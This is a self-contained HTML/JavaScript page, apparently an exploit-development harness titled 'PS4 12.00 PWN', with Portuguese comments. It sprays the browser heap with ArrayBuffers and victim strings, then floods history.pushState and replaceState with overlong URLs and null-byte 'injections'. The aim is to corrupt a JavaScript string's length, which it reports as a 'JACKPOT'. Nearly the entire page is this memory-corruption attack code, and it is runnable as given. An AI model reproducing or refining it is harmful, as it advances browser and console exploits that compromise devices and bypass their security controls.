<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 PWN (String Target)</title>
    <style>
        body { background-color: #000; color: #00ffff; font-family: monospace; padding: 20px; }
        #log { border: 1px solid #333; padding: 10px; height: 500px; overflow-y: scroll; white-space: pre-wrap; font-size: 14px;}
        button { padding: 15px; font-size: 1.2em; background: #111; color: #fff; border: 1px solid #0ff; margin: 10px 0; width: 100%; cursor: pointer; }
        button:hover { background: #222; }
        input { background: #222; color: #fff; border: 1px solid #555; padding: 5px; }
        .win { color: #000; font-weight: bold; border: 2px solid #fff; padding: 5px; background: #0f0; }
    </style>
</head>
<body>

<h1>REPLICA 100% + ALVO: STRINGS</h1>
<p>Meta: Corromper o tamanho de uma String JS.</p>

<h3>1. TESTE 6 (Incremental)</h3>
<label>Start:</label> <input type="number" id="t6start" value="1000">
<label>Step:</label> <input type="number" id="t6step" value="5000">
<button onclick="test6_Incremental()">Executar Teste 6</button>

<h3>2. TESTE 3 (Padrões)</h3>
<button onclick="test3_SpecialSequences()">Executar Teste 3</button>

<h3>3. TESTE 1 (Gatilho + String Attack)</h3>
<p style="color:red">ATENÇÃO: Cancele a mensagem de memória. O ataque é automático no final.</p>
<button onclick="test1_StringAttack()" style="border-color:red; color:red">Executar Teste 1</button>

<div id="log"></div>

<script>
const BASE_SAFE = 709522;
let heapObjects = [];
// Agora as vítimas são Strings, então guardamos em um array simples ou objetos wrapper
let victimStrings = []; 

function log(msg, type='') {
    const el = document.getElementById('log');
    const color = type === 'win' ? '#000' : '#0ff';
    const bg = type === 'win' ? '#0f0' : 'transparent';
    el.innerHTML += `<div style="color:${color}; background:${bg}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
    el.scrollTop = el.scrollHeight;
}

function prepareHeap() {
    log('Preparando heap...');
    heapObjects = [];
    victimStrings = [];
    
    // Spray de Preenchimento (Buffer)
    for (let i = 0; i < 500; i++) {
        const buf = new ArrayBuffer(1024);
        const view = new Uint32Array(buf);
        view.fill(0x41414141);
        heapObjects.push({buf, view});
    }
    // Holes
    for (let i = 0; i < heapObjects.length; i += 3) {
        heapObjects[i] = null;
    }
    
    // ALVOS: STRINGS
    // Criamos strings de tamanho específico (ex: 0x1000 bytes)
    // Usamos um objeto wrapper para manter a referência estável
    for (let i = 0; i < 100; i++) {
        // String com "V" (Victim) repetido
        let s = "V".repeat(2048); 
        // Forçamos a string a ser alocada no heap
        let o = { id: i, s: s };
        victimStrings.push(o);
    }
    log('Heap preparado (Alvos: Strings).');
}

function checkStringCorruption() {
    for (let i = 0; i < victimStrings.length; i++) {
        try {
            let obj = victimStrings[i];
            let s = obj.s;
            
            // Checagem 1: Tamanho Mudou?
            // O tamanho original era 2048
            if (s.length !== 2048) {
                log(`!!! JACKPOT !!! String ${i} TAMANHO MUDOU: ${s.length}`, 'win');
                alert(`STRING CORRUPTION!\nOriginal: 2048\nNovo: ${s.length}`);
                return true;
            }
            
            // Checagem 2: Conteúdo Mudou?
            // Se o primeiro caractere não for "V", foi sobrescrito
            if (s.charCodeAt(0) !== 86) { // 86 é 'V'
                log(`!!! JACKPOT !!! String ${i} CONTEÚDO MUDOU!`, 'win');
                return true;
            }

        } catch (e) {
            log(`String ${i} inacessível: ${e.message}`);
        }
    }
    return false;
}

// === TESTE 6 (INTOCADO) ===
async function test6_Incremental() {
    log('=== TESTE 6 ===');
    prepareHeap();
    const start = parseInt(document.getElementById('t6start').value);
    const step = parseInt(document.getElementById('t6step').value);
    let currentSize = start;
    for (let i = 0; i < 10; i++) {
        log(`Tentativa ${i+1}: ${currentSize} bytes`);
        try {
            const base = "A".repeat(BASE_SAFE);
            let overflow = "";
            for (let j = 0; j < currentSize; j++) overflow += String.fromCharCode(j % 33);
            history.pushState({}, `inc_${currentSize}`, "/" + base + overflow);
            currentSize += step;
            await new Promise(r => setTimeout(r, 1500)); 
        } catch (e) { break; }
    }
    log("Teste 6 OK.");
}

// === TESTE 3 (INTOCADO) ===
async function test3_SpecialSequences() {
    log('=== TESTE 3 ===');
    prepareHeap(); 
    const sequences = [
        { bytes: "\x00\x00\x00\x00" }, { bytes: "\x0A\x0A\x0A\x0A" }, 
        { bytes: "\x09\x09\x09\x09" }, { bytes: "\x0D\x0D\x0D\x0D" }, 
        { bytes: "\x20\x20\x20\x20" }, { bytes: "\x00\x09\x0A\x0D\x20" }
    ];
    for (let seq of sequences) {
        try {
            const base = "A".repeat(BASE_SAFE);
            let overflow = "";
            for (let i = 0; i < 1000; i++) overflow += seq.bytes;
            history.pushState({}, "pattern", "/" + base + overflow);
            await new Promise(r => setTimeout(r, 100)); 
        } catch (e) {}
    }
    log("Teste 3 OK.");
}

// === TESTE 1 (STRING ATTACK) ===
async function test1_StringAttack() {
    log('=== TESTE 1: STRING SMASHER ===');
    
    // Vítimas frescas no topo
    for(let k=0; k<50; k++) {
        let s = "V".repeat(2048); 
        victimStrings.unshift({id: 999, s: s}); 
    }

    for (let byte = 0x00; byte <= 0xFF; byte++) {
        try {
            const base = "A".repeat(BASE_SAFE);
            const testByte = String.fromCharCode(byte);
            const overflow = testByte.repeat(100); 
            const payload = "/" + base + overflow;
            history.pushState({}, `test_${byte}`, payload);
            if (byte % 32 === 0) await new Promise(r => setTimeout(r, 10)); 
        } catch (e) {
            log(`OOM em 0x${byte.toString(16)}...`);
        }
    }
    
    log("LOOP FINALIZADO. INJETANDO 29 BYTES (ZEROS)...");
    
    try {
        const base = "A".repeat(BASE_SAFE);
        
        // TENTATIVA 1: Null Bytes (Zeros)
        // Isso deve terminar a string prematuramente ou bugar o length
        const attack = "\x00".repeat(29); 
        
        history.replaceState({}, "PWN_STRING", "/" + base + attack);
        
        log(">>> INJEÇÃO FEITA. VERIFICANDO STRINGS... <<<", 'win');
        checkStringCorruption();
        
    } catch(ex) {
        log("Falha na injeção final: " + ex.message);
    }
}
</script>
</body>
</html>
